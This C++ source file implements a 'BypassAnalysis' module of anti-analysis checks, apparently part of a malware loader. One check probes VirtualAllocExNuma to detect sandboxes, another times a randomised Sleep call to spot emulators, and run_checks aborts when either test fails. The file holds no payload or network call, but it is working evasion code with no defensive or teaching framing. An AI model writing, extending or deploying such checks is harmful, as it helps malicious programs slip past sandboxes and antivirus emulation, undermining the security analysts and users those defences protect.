#include "bypass_analysis.hpp"
#include <windows.h>
#include <iostream>
#include <random>
#include <chrono>

bool BypassAnalysis::check_virtualization() {
    if (verbose) std::cout << "[*] Checking virtualization...\n";

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (kernel32) {
        FARPROC pVirtualAllocExNuma = GetProcAddress(kernel32, "VirtualAllocExNuma");
        if (pVirtualAllocExNuma) {
            using VirtualAllocExNuma_t = LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
            auto pFunc = reinterpret_cast<VirtualAllocExNuma_t>(pVirtualAllocExNuma);
            if (!pFunc(GetCurrentProcess(), NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0)) {
                std::cout << "[-] Sandbox detected (VirtualAllocExNuma)\n";
                return false;
            }
        }
    }

    if (verbose) std::cout << "[+] Virtualization check passed\n";
    return true;
}

bool BypassAnalysis::check_sleep_timing() {
    if (verbose) std::cout << "[*] Checking sleep timing...\n";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<DWORD> dis(3000, 5000);
    DWORD sleep_time = dis(gen);

    if (verbose) std::cout << "[*] Sleep time: " << sleep_time << "ms\n";

    auto start = std::chrono::high_resolution_clock::now();
    Sleep(sleep_time);
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    // Si la vraie durée est < 80% du sleep time demandé = emulator
    if (duration.count() < (sleep_time * 0.8)) {
        std::cout << "[-] Emulator/Fast execution detected\n";
        return false;
    }

    if (verbose) std::cout << "[+] Sleep timing check passed (" << duration.count() << "ms)\n";
    return true;
}

bool BypassAnalysis::run_checks() {
    if (verbose) std::cout << "\n=== ANTI-ANALYSIS CHECKS ===\n";

    if (!check_virtualization()) return false;
    if (!check_sleep_timing()) return false;

    if (verbose) std::cout << "[+] All checks passed\n\n";
    return true;
}
